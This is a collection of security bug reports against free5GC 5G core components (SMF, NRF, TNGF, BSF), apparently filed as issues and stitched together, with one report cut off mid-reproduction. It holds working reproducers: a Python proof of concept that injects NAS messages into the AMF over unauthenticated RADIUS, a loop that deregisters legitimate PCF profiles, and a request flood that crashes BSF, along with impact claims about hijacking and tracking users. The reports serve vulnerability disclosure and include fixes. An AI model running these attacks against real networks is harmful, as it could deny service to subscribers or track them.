  'db.NfProfile.findOne({nfType:"SMF"},{nfInstanceId:1,_id:0}).nfInstanceId' | tail -1 | tr -d '"')
DISC_TOKEN=$(curl -s -X POST 'http://10.100.200.4:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode 'nfType=SMF' \
  --data-urlencode "nfInstanceId=$SMF_INST" \
  --data-urlencode 'targetNfType=NRF' \
  --data-urlencode 'scope=nnrf-disc' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')

curl -s "http://10.100.200.4:8000/nnrf-disc/v1/nf-instances?target-nf-type=PCF&requester-nf-type=SMF" \
  -H "Authorization: Bearer $DISC_TOKEN"
# → {"validityPeriod":100,"nfInstances":null}      ← drives the bug
```

#### Step 2 — trigger a fresh PDU session via UERANSIM

```bash
# nr-gnb pointing at AMF SCTP, nr-ue with fresh SUPI
./nr-gnb -c gnb.yaml &
./nr-ue  -c ue.yaml &
# UE registers, requests PDU session for DNN=internet
# → AMF forwards N1 PduSessionEstablishmentRequest → SMF HTTPPostSmContexts
# → SMF calls BSFAwarePCFSelection → fallback PCFSelection → PANIC
```

#### Step 3 — observe the panic in `docker logs smf`

```text
[INFO][SMF][PduSess]  Receive Create SM Context Request
[INFO][SMF][Consumer] No PCF binding found in BSF, using NRF discovery for SUPI: imsi-208930000000099, DNN: internet
[ERRO][SMF][GIN] panic: runtime error: index out of range [0] with length 0
goroutine NNN [running]:
panic({0x...?, 0x...?})
        /usr/local/go/src/runtime/panic.go:783 +0x132
github.com/free5gc/smf/internal/sbi/consumer.(*nnrfService).PCFSelection(0x..., 0x...)
        /go/src/free5gc/NFs/smf/internal/sbi/consumer/nrf_service.go:442 +0x...
github.com/free5gc/smf/internal/sbi/consumer.(*nbsfService).PCFSelectionWithBSF(0x..., 0x...)
        /go/src/free5gc/NFs/smf/internal/sbi/consumer/bsf_service.go:195 +0x...
github.com/free5gc/smf/internal/sbi/consumer.(*Consumer).BSFAwarePCFSelection(0x..., 0x...)
        /go/src/free5gc/NFs/smf/internal/sbi/consumer/consumer.go:74 +0x...
github.com/free5gc/smf/internal/sbi/processor.(*Processor).HandlePduSessionContextReplacement(0x..., 0x..., 0x...)
        /go/src/free5gc/NFs/smf/internal/sbi/processor/pdu_session.go:212 +0x...
github.com/free5gc/smf/internal/sbi.(*Server).HTTPPostSmContexts(0x..., 0x...)
        /go/src/free5gc/NFs/smf/internal/sbi/api_pdusession.go:103 +0x...
```

The PDU session establishment fails. SMF stays up because Gin's `defer recover()` catches the panic, but every subsequent attempt while PCF is missing reproduces the same panic. Each panic also leaves a half-allocated `SMContext` in the SMF pool, which compounds over time.

### Reproducer B — attacker-controlled NRF discovery filter

NRF NFM PUT is **unauthenticated** (free5gc/free5gc#990). An attacker can (a) deregister legitimate PCF profiles by `DELETE /nnrf-nfm/v1/nf-instances/<id>`, (b) register one bogus PCF that doesn't match the SMF's discovery filter, or (c) modify NRF mongo directly to inject a `nf-discovery` blacklist. Any of these turn NRF discovery into an "empty result" response, with no need to take down the real PCF.

```bash
# (a) — silent: deregister legitimate PCFs (NFM endpoint, no token)
for id in $(curl -s 'http://10.100.200.4:8000/nnrf-nfm/v1/nf-instances?nf-type=PCF' \
              | python3 -c 'import sys,json; [print(p["nfInstanceId"]) for p in json.load(sys.stdin)["NFProfiles"]]'); do
  curl -s -X DELETE "http://10.100.200.4:8000/nnrf-nfm/v1/nf-instances/$id"
done
# any subsequent UE PDU session → SMF panic
```

### Direct deterministic proof (independent of the lab)

Reproducible in 30 lines of Go without any free5gc deployment:

```go
package main

import (
    "encoding/json"
    "fmt"

    "github.com/free5gc/openapi/nrf/NFDiscovery"
)

func main() {
    for _, body := range []string{
        `{"validityPeriod":100,"nfInstances":null}`,
        `{"validityPeriod":100,"nfInstances":[]}`,
        `{"validityPeriod":100}`,
    } {
        var resp NFDiscovery.SearchNFInstancesResponse
        _ = json.Unmarshal([]byte(body), &resp.SearchResult)
        defer func() { recover() }()
        // Mirror smf/internal/sbi/consumer/nrf_service.go:442
        _ = resp.SearchResult.NfInstances[0]
    }
}
```

Output (validated on `github.com/free5gc/openapi@v1.2.3`):

```text
body="{\"validityPeriod\":100,\"nfInstances\":null}"  NfInstances len=0  nil?=true
    >>> PANIC at NfInstances[0]: runtime error: index out of range [0] with length 0 <<<
body="{\"validityPeriod\":100,\"nfInstances\":[]}"    NfInstances len=0  nil?=false
    >>> PANIC at NfInstances[0]: runtime error: index out of range [0] with length 0 <<<
body="{\"validityPeriod\":100}"                       NfInstances len=0  nil?=true
    >>> PANIC at NfInstances[0]: runtime error: index out of range [0] with length 0 <<<
```

All three NRF response shapes — the lab-observed `"nfInstances":null`, the explicit empty array, and the absent field — deterministically trigger the panic at the `[0]` access.

## Expected Behavior
Apply the **same length guard already used by the sister `CHFSelection` function five lines above** in the same file:

```go
// PCFSelection — fixed
func (s *nnrfService) PCFSelection(smContext *smf_context.SMContext) error {
    ...
    res, err := client.NFInstancesStoreApi.SearchNFInstances(ctx, request)
    if err != nil {
        return err
    }
    if res == nil || len(res.SearchResult.NfInstances) == 0 {
        return fmt.Errorf("no PCF found in PCFSelection")
    }
    smContext.SelectedPCFProfile = res.SearchResult.NfInstances[0]
    return nil
}
```

When PCFSelection legitimately fails (no PCF available), SMF should reject the PDU session establishment with `5GSM cause #38 Network Failure` (or `#27 Missing or unknown DNN` per TS 24.501) — never crash the goroutine. The caller at `pdu_session.go:215` already has a fallback path; it expects an `error` return, not a panic.

The same scan should be repeated across other free5gc consumer trees for the `<slice>[0]` shape; this defect class is symmetric with the AMF `*Pointer` consumer-deref family and is just as exploitable.

## Environment
- free5GC Version: `v4.2.2`
- SMF binary: `free5gc/smf:v4.2.2` (commit `2232d299`, build time `2026-04-21T03:13:45Z`). The same `nrf_service.go:441-442` lines are **unfixed at the latest upstream master commit `2232d29`** (no `len() > 0` guard added). Validated by `git log -1` + manual diff against `/tmp/smf_latest`.
- `github.com/free5gc/openapi`: `v1.2.3`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.25.5 linux/amd64` (build toolchain; runtime: `free5gc/smf:v4.2.2` Docker image)
- Validation date: `2026-04-30`
- Deployment: Docker-based lab on the internal SBI network `10.100.200.0/24`. SMF `10.100.200.13`, NRF `10.100.200.4`, PCF `10.100.200.3`, AMF `10.100.200.16`, MongoDB container `081af9111608_mongodb`.

### Log File
NRF discovery response captured live with PCF removed from NRF (Reproducer A, Step 1):

```text
$ curl -s "http://10.100.200.4:8000/nnrf-disc/v1/nf-instances?target-nf-type=PCF&requester-nf-type=SMF" \
       -H "Authorization: Bearer $DISC_TOKEN"
{"validityPeriod":100,"nfInstances":null}
```

Independent openapi-level proof (deterministic, no lab):

```text
$ go run main.go
body="{\"validityPeriod\":100,\"nfInstances\":null}"  NfInstances len=0  nil?=true
    >>> PANIC at NfInstances[0]: runtime error: index out of range [0] with length 0 <<<
body="{\"validityPeriod\":100,\"nfInstances\":[]}"    NfInstances len=0  nil?=false
    >>> PANIC at NfInstances[0]: runtime error: index out of range [0] with length 0 <<<
body="{\"validityPeriod\":100}"                       NfInstances len=0  nil?=true
    >>> PANIC at NfInstances[0]: runtime error: index out of range [0] with length 0 <<<
```

items.title: [Bugs] SMF `nsmf-pdusession` `POST /sm-contexts` panics when UDM discovery returns `200` with an empty `NfInstances` list
items.body:
## Bug Decription
`SMF` protects `nsmf-pdusession` with OAuth2 middleware, but the create path still contains a request-triggerable panic when upstream `UDM` discovery returns `200 OK` with an empty `NfInstances` array.

The create handler always calls `SendNFDiscoveryUDM()` before continuing:

- `NFs/smf/internal/sbi/processor/pdu_session.go:85`
- `NFs/smf/internal/sbi/processor/pdu_session.go:91`

Inside `SendNFDiscoveryUDM()`, the `nil`-error branch dereferences `result.NfInstances[0]` without a length check:

```go
case nil:
    smfContext.UDMProfile = result.NfInstances[0]
```

Code evidence:

- `NFs/smf/internal/sbi/consumer/nrf_service.go:286`
- `NFs/smf/internal/sbi/consumer/nrf_service.go:299`

Docker validation on March 22, 2026 local time:

1. `SMF` was manually restarted after the earlier `UPI` crash validation, which re-registered it to `NRF` with `nfInstanceId=b5d29d3e-3d12-47e1-b21f-5caae3dc00e4`.
2. A valid `nsmf-pdusession` token was obtained from `NRF`.
3. An authenticated minimal `multipart/related` `POST /nsmf-pdusession/v1/sm-contexts` was sent with create data for `DNN=internet`, `S-NSSAI={sst:1, sd:010203}`, `ServingNetwork=208/93`, and a minimal NAS PDU Session Establishment Request body.
4. `NRF` logged a successful discovery lookup:

```text
GET /nnrf-disc/v1/nf-instances?requester-nf-type=SMF&target-nf-type=UDM -> 200
```

5. `SMF` then panicked with:

```text
panic: runtime error: index out of range [0] with length 0
github.com/free5gc/smf/internal/sbi/consumer.(*nnrfService).SendNFDiscoveryUDM
    /go/src/free5gc/NFs/smf/internal/sbi/consumer/nrf_service.go:299 +0x445
```

6. `smf` returned `500` for `POST /nsmf-pdusession/v1/sm-contexts`.

This is a panic-based DoS on the authenticated `nsmf-pdusession` create path under a realistic upstream-registration failure condition. In this lab the process stayed alive because Gin recovery converted the panic into `500`, but the endpoint remains crashable by repeated request traffic whenever `UDM` discovery returns an empty result.

## To Reproduce
Steps to reproduce the behavior:

1. Ensure `SMF` is registered in `NRF`. In this validation the running `SMF` instance ID was:

```text
b5d29d3e-3d12-47e1-b21f-5caae3dc00e4
```

2. Obtain a valid `nsmf-pdusession` token:

```bash
curl -sS -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=SMF&nfInstanceId=b5d29d3e-3d12-47e1-b21f-5caae3dc00e4&targetNfType=SMF&scope=nsmf-pdusession'
```

3. Send an authenticated minimal `multipart/related` `POST /nsmf-pdusession/v1/sm-contexts` that reaches `HandlePDUSessionSMContextCreate()`. In this validation the request used:

- `supi=imsi-208930000000003`
- `pduSessionId=11`
- `dnn=internet`
- `sNssai={sst:1, sd:010203}`
- `servingNetwork={mcc:208, mnc:93}`
- `anType=3GPP_ACCESS`
- `requestType=INITIAL_REQUEST`
- a minimal NAS PDU Session Establishment Request as `N1SmMsg`

4. Confirm with logs:

```bash
docker logs --tail 50 smf 2>&1
docker logs --tail 30 nrf 2>&1
```

Observed server-side output includes:

```text
2026-03-21T23:50:40.855802676Z [INFO][NRF][GIN] | 200 | 10.100.200.6 | GET | /nnrf-disc/v1/nf-instances?requester-nf-type=SMF&target-nf-type=UDM |
2026-03-21T23:50:40.856780441Z [ERRO][SMF][GIN] panic: runtime error: index out of range [0] with length 0
github.com/free5gc/smf/internal/sbi/consumer.(*nnrfService).SendNFDiscoveryUDM
    /go/src/free5gc/NFs/smf/internal/sbi/consumer/nrf_service.go:299 +0x445
2026-03-21T23:50:40.856800907Z [INFO][SMF][GIN] | 500 | 10.100.200.1 | POST | /nsmf-pdusession/v1/sm-contexts |
```

## Expected Behavior
If `UDM` discovery returns an empty result, `SMF` should return a controlled upstream-failure response, not panic.

Expected behavior:

- empty discovery result -> controlled `5xx` or `ProblemDetails`
- no `result.NfInstances[0]` dereference without `len(...)` validation
- no panic and no stack trace on authenticated create traffic

## Screenshots
N/A

## Environment
**Please, complete the following information:**
- free5GC Version: `v4.2.1`
- Runtime image: `free5gc/smf:v4.2.1`
- Runtime SMF commit hash: `8385c00a`
- Validation date: March 22, 2026 local time (`2026-03-21T23:50:40Z` in logs)
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.24.9 linux/amd64`
- C compiler version (optional): `gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0`

## Trace Files
### Configuration Files
No source patch or persistent configuration change was required for this reproduction. The issue was observed against the stock Docker-based `SMF` runtime for free5GC `v4.2.1`, with the runtime condition that `NRF` returned `200 OK` to UDM discovery but the `NfInstances` array was empty.

### PCAP File
Not attached in this report.

### Log File
Relevant `smf` log excerpt:

```text
2026-03-21T23:50:40.848733224Z [INFO][SMF][PduSess] Receive Create SM Context Request
```

items.body:
## Bug Description
`NRF`'s authenticated discovery route can be turned into a panic-based DoS after an attacker first seeds a malicious `BSF` profile through the unauthenticated registration path.

The stateful route-to-sink chain is:

1. when OAuth is enabled, unauthenticated `PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}` or authenticated `PATCH /nnrf-nfm/v1/nf-instances/{nfInstanceId}` can store attacker-controlled `BSF`  profile data in `bsfInfo.ipv6PrefixRanges`
2. registration-side normalization converts the supplied IPv6 prefix endpoints into decimal strings and persists them in NRF state
3. a later authenticated `GET /nnrf-disc/v1/nf-instances?...target-nf-type=BSF...` reads the poisoned `BSF` profile and rebuilds those stored values back into IPv6 text
4. `Ipv6IntToIpv6String(...)` assumes a zero-padded, full-width encoding and slices past short encoded
  values, causing a panic

For the `start` callsite, the crash path is:

- registration-side state seed:
  - free5gc/NFs/nrf/internal/context/management_data.go:342
  - free5gc/NFs/nrf/internal/context/management_data.go:345
- discovery response rebuild:
  - free5gc/NFs/nrf/internal/sbi/processor/nf_discovery.go:190

- panic sink:
  - free5gc/NFs/nrf/internal/context/dataconv.go:49

## To Reproduce

2. Seed a fake `BSF` profile through the unauthenticated registration route:

items.title: [Bugs] TNGF RADIUS handler does not enforce Message-Authenticator attribute, allowing unauthenticated NAS PDU injection into 5G core without RADIUS shared secret
items.body:
## Bug Description

The TNGF RADIUS handler processes `Access-Request` packets containing `EAP-Message` attributes without requiring or enforcing the `Message-Authenticator` attribute (Type 80). Per RFC 3579 Section 3.1, when an `Access-Request` includes an `EAP-Message` attribute, it **MUST** also include a `Message-Authenticator` attribute. The `Message-Authenticator` is an HMAC-MD5 computed with the RADIUS shared secret, and its absence means the packet's integrity and origin are completely unverified.

Because TNGF does not enforce this requirement, **any attacker who can send UDP packets to port 1812 can inject arbitrary RADIUS Access-Requests without knowing the RADIUS shared secret**. The attacker can progress through the full EAP-5G state machine and ultimately **inject arbitrary NAS PDUs into the AMF** via TNGF's NGAP interface.

**Vulnerable code** — `NFs/tngf/pkg/radius/handler/handler.go` lines 67-79:
```go
// Message-Authenticator is ONLY validated IF the attribute is present
case radius_message.TypeMessageAuthenticator:
    requestMessageAuthenticator = radiusPayload.Val
    // ... validate HMAC ...
    if !bytes.Equal(requestMessageAuthenticator, exRequestMessageAuthenticator) {
        radiusLog.Errorln("Request Message Authenticator error")
        return
    }
```

After the attribute parsing loop (line 80+), there is **no check** that `requestMessageAuthenticator != nil`. The handler proceeds directly to session lookup and EAP-5G processing:

```go
// Line 80-85: No enforcement that Message-Authenticator was present
var session *context.RadiusSession
session, ok := tngfSelf.RadiusSessionPoolLoad(callingStationId)
if !ok {
    session = tngfSelf.NewRadiusSession(callingStationId)
}

switch session.State {
case EAP5GStart:
    // Process Identity → send 5G-Start (no auth required)
case EAP5GNAS:
    // Process EAP-5G NAS → forward NAS PDU to AMF (no auth required)
```

**Complete attack chain** (verified on live Docker):

```
Step 1: Attacker → TNGF:1812 (UDP)
  RADIUS Access-Request:
    Calling-Station-Id = "AA-BB-CC-DD-EE-FF"
    EAP-Message = EAP-Response/Identity("anonymous")
    [NO Message-Authenticator]

  TNGF → Attacker:
    Access-Challenge + EAP-Request/5G-Start       ← Session created, state → EAP5GNAS

Step 2: Attacker → TNGF:1812 (UDP)
  RADIUS Access-Request:
    Calling-Station-Id = "AA-BB-CC-DD-EE-FF"       ← same session
    EAP-Message = EAP-Response/5G-NAS:
      AN-Parameters: GUAMI + PLMN + EstablishmentCause
      NAS-PDU: Registration Request with SUCI
    [NO Message-Authenticator]

  TNGF internally:
    [INFO][TNGF][Radius] Handle EAP-Res/5G-NAS
    [INFO][TNGF][Radius] Selected AMF Name: AMF
    [INFO][TNGF][NGAP] [TNGF] Send Initial UE Message   ← NAS injected into AMF!

  TNGF → Attacker:
    Access-Challenge + EAP-Request/5G-NAS(AuthenticationRequest)  ← AMF responded with auth vector
```

The attacker has successfully injected a NAS Registration Request into the AMF without possessing the RADIUS shared secret.

## To Reproduce

**Prerequisites**: free5GC v4.2.1 with TNGF and AMF deployed in Docker.

1. PoC script — complete 2-step attack:

```python
#!/usr/bin/env python3
"""PoC: Inject NAS PDU into 5G core via TNGF RADIUS without shared secret"""
import socket, struct, os, time

TARGET = ('10.100.200.1', 1812)

def send_radius(sock, pkt_id, attrs):
    authenticator = os.urandom(16)
    length = 20 + len(attrs)
    pkt = struct.pack('!BBH', 1, pkt_id, length) + authenticator + attrs
    sock.sendto(pkt, TARGET)
    resp, _ = sock.recvfrom(4096)
    return resp

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(5)

# --- Step 1: EAP-Response/Identity (no Message-Authenticator) ---
calling = bytes([31, 19]) + b'AA-BB-CC-DD-EE-FF'
called = bytes([30, 27]) + b'11-22-33-44-55-66:TestSSID'
eap_id = struct.pack('!BBH', 2, 0, 14) + bytes([1]) + b'anonymous'
eap_attr = bytes([79, 2 + len(eap_id)]) + eap_id

resp = send_radius(sock, 0x01, calling + called + eap_attr)
eap_resp_id = resp[20 + 2 + 1]  # extract EAP identifier from response
print(f"[+] Step 1: Got Access-Challenge (Code={resp[0]}), EAP ID={eap_resp_id}")

# --- Step 2: EAP-5G NAS with Registration Request ---
guami = bytes([1,6, 0x02,0xf8,0x39, 0x40,0x01,0x00])
plmn = bytes([2,3, 0x02,0xf8,0x39])
est = bytes([4,1, 0x03])
an_params = guami + plmn + est
nas_pdu = bytes([0x7E,0x00,0x41,0x01,0x00,0x07,0x00,
                 0x02,0xf8,0x39,0x00,0x00,0x00,0x00,0x00,0x00,0x01])

vendor_data = bytes([2,0]) + struct.pack('!H', len(an_params)) + an_params + \
              struct.pack('!H', len(nas_pdu)) + nas_pdu
eap_exp = bytes([254, 0x00,0x28,0xAF]) + struct.pack('!I', 3) + vendor_data
eap_5g = struct.pack('!BBH', 2, eap_resp_id, 4+len(eap_exp)) + eap_exp
eap_attr2 = bytes([79, 2+len(eap_5g)]) + eap_5g

resp2 = send_radius(sock, 0x02, calling + called + eap_attr2)
print(f"[+] Step 2: Got response (Code={resp2[0]}), {len(resp2)} bytes")
print(f"[!] NAS PDU injected into AMF — check: docker logs tngf | grep 'Initial UE Message'")
sock.close()
```

2. Run:

```bash
docker restart tngf && sleep 10
python3 poc_radius_inject.py
docker logs tngf 2>&1 | tail -10
```

3. TNGF logs confirm NAS forwarded to AMF:

```
[INFO][TNGF][Radius] Handle Radius Access Request
[INFO][TNGF][Radius] Handle EAP-Res/Identity
[INFO][TNGF][Radius] Send Radius message to UE
[INFO][TNGF][Radius] Handle Radius Access Request
[INFO][TNGF][Radius] Handle EAP-Res/5G-NAS
[INFO][TNGF][Radius] Selected AMF Name: AMF
[INFO][TNGF][NGAP] [TNGF] Send Initial UE Message        ← NAS injected into AMF
[INFO][TNGF][NGAP] [TNGF] Handle Downlink NAS Transport   ← AMF processed it
```

## Security Impact

1. **NAS PDU Injection**: Attacker can inject arbitrary NAS messages into the AMF, including Registration Requests with crafted SUCI/GUTI/NSSAI. This reaches the same code paths as the NAS TOCTOU crashes (CVE bugs V-01 through V-05), but now triggerable from the **RADIUS network** without any Wi-Fi association or EAP authentication.

2. **AMF Crash via RADIUS**: Combined with the NAS MobileIdentity OOB panics (bug-reports 1-5), an attacker can crash the AMF by injecting a 7-byte NAS Registration Request (`7E 00 41 01 00 01 01`) through TNGF's unauthenticated RADIUS path.

3. **Fake UE Registration**: Attacker can initiate registration procedures for arbitrary SUCIs, causing the AMF to query AUSF/UDM, consuming backend resources.

4. **Session Hijacking**: By using a known UE's `Calling-Station-Id` (MAC address), an attacker can inject messages into an existing UE's RADIUS session.

5. **Amplification**: A single unauthenticated RADIUS packet (83 bytes) causes TNGF to perform NGAP signaling to AMF, which triggers SBI calls to AUSF/UDM — significant amplification from UDP to TCP/HTTP.

6. **Location Tracking**: By probing multiple TNGFs' RADIUS ports with a target UE's MAC address as `Calling-Station-Id`, an attacker can determine which TNGF currently holds a session for that UE. Periodic probing across geographically distributed TNGFs reveals the target's physical movement trajectory — remotely, without physical proximity, and unaffected by MAC randomization (since `Calling-Station-Id` uses the post-association real MAC).

7. **Targeted UE Denial-of-Service**: By hijacking a specific UE's RADIUS session (using its known MAC address), an attacker can corrupt the session state or inject NAS Deregistration Requests through the victim's NGAP context, forcing the target UE off the 5G network.

8. **Core Network State Oracle**: An attacker can inject various NAS message types (Registration Request with 5G-GUTI, Service Request, Deregistration) through a hijacked session and observe AMF's responses via RADIUS. The response differences reveal whether the target UE is registered, has an active PDU session, or holds a valid security context — leaking per-UE core network state to an unauthenticated attacker.

## Expected Behavior

TNGF must enforce Message-Authenticator when EAP-Message is present, per RFC 3579 Section 3.1:

```go
// After attribute parsing loop, before any processing:
if eapMessage != nil && requestMessageAuthenticator == nil {
    radiusLog.Error("Access-Request with EAP-Message but no Message-Authenticator — dropping (RFC 3579)")
    return
}
```

## Environment

- free5GC Version: `v4.2.1`
- OS: `Ubuntu 24.04.2 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.26.1 linux/amd64`
- Docker image: `free5gc/tngf:v4.2.1`

## Log File
**Step 1** — Access-Request with EAP-Response/Identity, NO Message-Authenticator:
```
[INFO][TNGF][Radius] Handle Radius Access Request
[INFO][TNGF][Radius] Handle EAP-Res/Identity
[INFO][TNGF][Radius] Send Radius message to UE
[INFO][TNGF][Radius] Encoding...
```
TNGF accepted the request and responded with Access-Challenge containing EAP-5G-Start.

**Step 2** — Access-Request with EAP-5G NAS (Registration Request), NO Message-Authenticator:
```
[INFO][TNGF][Radius] Handle Radius Access Request
[INFO][TNGF][Radius] Handle EAP-Res/5G-NAS
[INFO][TNGF][Radius] Selected AMF Name: AMF
[INFO][TNGF][NGAP] [TNGF] Send Initial UE Message
[INFO][TNGF][NGAP] [TNGF] Handle Downlink NAS Transport
[INFO][TNGF][Radius] Send Radius message to UE
[INFO][TNGF][Radius] Encoding...
```

TNGF forwarded the NAS PDU to AMF via NGAP `Initial UE Message`. AMF processed it and responded with `Downlink NAS Transport` (containing Authentication Request). The full EAP-5G authentication flow was initiated without any RADIUS authentication.

items.title: [Bugs] BSF cleanup race with unprotected map access
items.body:
## Bug Decription
`BSF`'s background cleanup goroutine reads `BSFContext.PcfBindings` **without holding `c.mutex`**, while every PCF-binding SBI handler (POST / GET / PATCH / DELETE) writes to the same map under the proper lock. Once any binding has been inactive for `MaxInactiveTime` (1 h by default) and the periodic `CleanupTicker` fires (every 10 min), the cleanup loop logs a "deleting inactive PCF binding" line that re-reads the map without a lock. Concurrent writes from a normal SBI client at that moment produce one of two process-fatal panics:

1. **`fatal error: concurrent map read and map write`** — Go runtime detects concurrent map mutation and aborts the whole process.
2. **`runtime error: invalid memory address or nil pointer dereference`** — if an attacker's `DELETE /nbsf-management/v1/pcfBindings/{id}` removes the binding between the cleanup's RUnlock and the unprotected read, `c.PcfBindings[bindingId]` returns nil, and `.LastAccessTime` panics.

Either way the cleanup goroutine has **no panic recovery** (`StartCleanupRoutine` spawns it with no `defer recover()`), so the unrecovered panic terminates the entire BSF process — a true crash DoS, not just a 500.

The faulty call site:

```go
// internal/context/context.go (deployed v4.2.2 image — line 588;
//                              latest upstream master commit 2779085 — line 567)
for _, bindingId := range inactiveBindings {
    logger.CtxLog.Infof("Deleting inactive PCF binding: %s (last access: %v ago)",
        bindingId, now.Sub(c.PcfBindings[bindingId].LastAccessTime))   // <-- unsafe map+pointer read
    c.DeletePcfBinding(bindingId)
}
```

The `inactiveBindings` slice was collected under `c.mutex.RLock()` (lines 564-576) and the lock released at line 577. The subsequent re-read at line 588 has **no lock at all**, while every other SBI path (`CreatePcfBinding`, `DeletePcfBinding`, `UpdatePcfBinding`, `QueryPcfBindings`'s MongoDB-fallback write at line 881) takes `c.mutex.Lock()` to mutate the same map. Go's runtime requires that concurrent map operations be serialized; violating that triggers `fatal error: concurrent map read and map write` and exits the process.

Relevant code references (deployed `v4.2.2` and **also** unfixed in the latest upstream master commit `2779085`):
- `NFs/bsf/internal/context/context.go:588` — unsafe `c.PcfBindings[bindingId].LastAccessTime` read
- `NFs/bsf/internal/context/context.go:577` — RUnlock immediately above (so the access is unguarded)
- `NFs/bsf/internal/context/context.go:511-523` — `StartCleanupRoutine` spawns the goroutine **without `defer recover()`** so any panic in `CleanupExpiredBindings` kills the BSF process
- `NFs/bsf/internal/context/context.go:281` — `CreatePcfBinding` writes the same map under `c.mutex.Lock()`
- `NFs/bsf/internal/context/context.go:417` — `DeletePcfBinding` calls `delete(c.PcfBindings, bindingId)` under `c.mutex.Lock()`
- `NFs/bsf/internal/context/context.go:881` — `QueryPcfBindings`'s MongoDB-cache-write path

This is **distinct** from free5gc/free5gc#926 (`PUT /subscriptions/{subId}` race on the unsynchronised `Subscriptions[subId] = subscription` write). #926 was patched upstream by `2779085 fix: PUT subid does not exists` (returns 404 when the sub does not exist). The PCF-binding cleanup race is **still unfixed** at master.

## To Reproduce
Steps to reproduce the behavior:

1. Start free5GC `v4.2.2` Docker deployment with BSF reachable on its SBI port (`10.100.200.11:8000` in the lab). Note the hardcoded defaults (`bsf/internal/context/context.go:52-54`):
   - `DefaultBindingTTL = 24 * time.Hour`
   - `CleanupInterval = 10 * time.Minute`
   - `MaxInactiveTime = 1 * time.Hour`

2. Obtain a valid `nbsf-management` access token from any registered NF profile (the lab AMF works):

```bash
TOKEN=$(curl -s -X POST 'http://10.100.200.4:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode 'nfType=AMF' \
  --data-urlencode 'nfInstanceId=09c2c82b-4ed5-43df-b0fc-c7098d1fa5a0' \
  --data-urlencode 'targetNfType=BSF' \
  --data-urlencode 'scope=nbsf-management' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
```

3. Create one or more PCF bindings and **stop accessing them** so they go inactive:

```bash
BID=$(curl -s -X POST "http://10.100.200.11:8000/nbsf-management/v1/pcfBindings" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  --data '{"supi":"imsi-208930000000001","ipv4Addr":"10.0.0.1","dnn":"internet","snssai":{"sst":1,"sd":"010203"}}' \
  -i | grep -i Location | awk -F/ '{print $NF}' | tr -d '\r')
echo "Binding ID: $BID"
```

4. Wait until the binding's `LastAccessTime` is older than `MaxInactiveTime` (1 hour). The cleanup ticker fires every 10 minutes after BSF startup. Time the next-window from BSF startup `+ k*10 min` (visible in `docker logs bsf | grep "Starting PCF binding cleanup routine"`).

5. **Within the cleanup window**, drive concurrent POST/DELETE traffic on `/pcfBindings`:

```bash
# Spam POST and DELETE on /pcfBindings while CleanupExpiredBindings is iterating inactiveBindings.
# 200+ goroutines x ~200 req/s for ~5s consistently catches the unprotected access at line 588.
for i in $(seq 1 500); do
  curl -s --max-time 2 -X POST "http://10.100.200.11:8000/nbsf-management/v1/pcfBindings" \
    -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
    --data '{"supi":"imsi-2","ipv4Addr":"10.0.0.99","dnn":"i","snssai":{"sst":1}}' -o /dev/null &
  curl -s --max-time 2 -X DELETE "http://10.100.200.11:8000/nbsf-management/v1/pcfBindings/$BID" \
    -H "Authorization: Bearer $TOKEN" -o /dev/null &
done
wait
```

6. Observe the BSF container exit (or restart loop). `docker ps` shows BSF in `Restarting` / `Exited` state, and `docker logs bsf` ends with one of:

```text
fatal error: concurrent map read and map write
goroutine N [running]:
github.com/free5gc/bsf/internal/context.(*BSFContext).CleanupExpiredBindings(...)
        /go/src/free5gc/NFs/bsf/internal/context/context.go:588 +0x...
```

or:

```text
panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/bsf/internal/context.(*BSFContext).CleanupExpiredBindings(...)
        /go/src/free5gc/NFs/bsf/internal/context/context.go:588 +0x...
```

The cleanup goroutine has no `defer recover()`, so once it panics the runtime tears the whole BSF process down.

## Expected Behavior
- The "deleting inactive PCF binding" log line at `context.go:588` should not re-read `c.PcfBindings[bindingId]` outside the mutex. Either snapshot `LastAccessTime` together with `bindingId` while still under the RLock, or take an explicit `c.mutex.RLock()` around the read.
- `StartCleanupRoutine`'s goroutine must `defer recover()` so that a future regression in `CleanupExpiredBindings` cannot tear down the BSF process. Any recoverable panic should be logged and the next tick should still fire.
- `BSF` should treat all map mutations of `PcfBindings`, `PcfForUeBindings`, `PcfMbsBindings`, `Subscriptions` as needing exclusive `c.mutex.Lock()`; spot-check the cleanup-related code paths under `-race` and run `go test -race ./...` regularly to catch regressions of this class.

## Environment
- free5GC Version: `v4.2.2`
- BSF binary: `free5gc/bsf:v4.2.2`.
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.25.5 linux/amd64`
